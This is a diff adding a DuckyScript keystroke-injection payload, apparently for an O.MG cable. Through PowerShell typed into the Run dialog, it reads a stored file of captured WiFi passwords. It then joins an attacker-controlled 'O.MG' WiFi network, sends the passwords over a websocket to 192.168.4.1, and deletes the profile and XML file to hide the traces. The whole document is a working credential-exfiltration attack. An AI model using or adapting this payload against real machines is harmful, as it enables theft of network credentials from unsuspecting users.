@@ -1,0 +1,27 @@
+DELAY 1000
+DUCKY_LANG DE
+GUI r
+DELAY 500
+STRINGLN cd c:\Temp
+STRINGLN $passwords = Get-Content -Path .\wifi_passwords.txt
+STRING echo '<?xml version="1.0"?><WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
+STRING <name>O.MG</name><SSIDConfig><SSID><name>O.MG</name></SSID></SSIDConfig><connectionType>ESS</connectionType>
+STRING <MSM><security><authEncryption><authentication>WPA2PSK</authentication><encryption>AES</encryption><useOneX>
+STRING false</useOneX></authEncryption><sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>
+STRING 12345678</keyMaterial></sharedKey></security></MSM></WLANProfile>' > profile.xml
+ENTER
+STRINGLN netsh wlan add profile "profile.xml"
+STRINGLN netsh wlan connect name=O.MG
+STRINGLN $socket = New-Object Net.WebSockets.ClientWebSocket
+STRINGLN $ct = New-Object Threading.CancellationToken($false)
+STRINGLN $connectTask = $ws.ConnectAsync("ws://192.168.4.1/d/ws/issue", $ct)
+DELAY 20000
+STRINGLN $ct = New-Object Threading.CancellationToken($false)
+STRINGLN $command = "[custom]CTSet`tcaptured`t$passwords"
+STRINGLN [ArraySegment[byte]]$msg = [Text.Encoding]::Utf8.GetBytes($command)
+STRINGLN $ws.SendAsync($msg, [System.Net.WebSockets.WebSocketMessageType]::Binary, $true, $ct).GetAwaiter().GetResult()
+DELAY 1000
+STRINGLN netsh wlan disconnect
+STRINGLN netsh wlan delete profile name="O.MG"
+STRINGLN del .\profile.xml
+STRINGLN exit
